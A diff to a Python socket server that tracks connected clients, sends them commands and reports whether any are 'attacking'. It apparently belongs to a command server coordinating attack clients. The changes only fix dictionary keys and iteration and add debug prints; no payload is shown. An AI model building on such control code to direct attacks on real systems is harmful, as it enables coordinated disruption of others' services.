@@ -20,14 +20,14 @@ def acceptor(s: socket.socket):
     while not stop_event.is_set():
         try:
             connection, address = s.accept()
+            ip, port = address
+            conn_name = ip +":"+ str(port)
             print("Got connection from ", address)
             with active_connections_lock:
                 active_connections += 1
             print("currently handling", active_connections, "connections")
             client_thread = threading.Thread(target=handle_client, args=(connection, address))
             client_thread.start()
-            with conn_dict_lock:
-                conn_dict[address] = "stopped"
             print(conn_dict)
         except socket.timeout:  
             # use periodic time outs to check if the user has pressed ctrl+c, 
@@ -41,7 +41,9 @@ def handle_client(conn: socket.socket, addr):
     global command
     global conn_dict
     conn.settimeout(1)
-    state = None
+    state = "stopped"
+    ip, port = addr
+    conn_name = ip +":"+ str(port)
     
     while not stop_event.is_set():
         try:
@@ -68,7 +70,7 @@ def handle_client(conn: socket.socket, addr):
                 print("command is ", command.encode())
                 conn.send(command.encode())
             with conn_dict_lock:
-                conn_dict[addr] = state
+                conn_dict[conn_name] = state
         command = ""
 
     conn.close()
@@ -77,16 +79,18 @@ def handle_client(conn: socket.socket, addr):
         active_connections -= 1
         print(active_connections, "connections left")
     with conn_dict_lock:
-        del conn_dict[addr]
+        del conn_dict[conn_name]
 
 
 def getAttackDetails():
     conn_list = []
     is_attacking = False
     state = "Idle"
-    for key, val in conn_dict:
+    print(conn_dict)
+    for key, val in conn_dict.items():
+        print("wtf?", key, val)
         conn_list.append({key:val})
-    for key, val in conn_dict:
+    for key, val in conn_dict.items():
         if val == "attacking":
             is_attacking = True
             break
